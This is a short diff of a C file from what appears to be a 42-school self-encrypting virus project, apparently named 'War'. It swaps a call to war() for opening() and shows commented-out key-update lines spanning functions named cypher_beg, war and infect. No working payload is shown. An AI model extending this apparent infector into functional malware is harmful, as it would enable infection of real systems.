@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/26 14:07:42 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/26 14:32:30 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -40,7 +40,6 @@ void	start(void)
 		);
 
 	t_data	data = {0};
-
 	__asm__ __volatile__ (
 		"mov	%0, rsp"
 		: "=r"(data.rsp)
@@ -60,6 +59,7 @@ void	cypher_beg(t_data *data)
 //	update_one(&data.key, (char*)cypher_beg, (size_t)war - (size_t)cypher_beg);
 //	printf("beg key = %lx\n", data.key.one);
 //	revert_one(&data.key, (char*)war, (size_t)infect - (size_t)war);
-	war(data);
+	opening(data);
+//	war(data);
 
 }
